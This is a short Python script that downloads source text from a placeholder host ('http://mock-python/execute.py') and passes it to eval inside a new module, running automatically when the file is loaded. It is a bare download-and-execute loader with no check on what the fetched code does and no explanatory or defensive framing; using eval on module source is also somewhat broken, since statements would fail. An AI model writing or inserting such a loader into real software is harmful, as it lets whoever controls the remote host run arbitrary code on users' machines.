import urllib.request
import types

def get_url():
    return "http://mock-python/execute.py"

def get_response(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def create_module():
    return types.ModuleType("sm")

def eval_code(src, module):
    try:
        eval(src, module.__dict__)
    except Exception as e:
        print("Error occurred:", e)

def main():
    url = get_url()
    source = get_response(url)
    module = create_module()
    eval_code(source, module)

main()
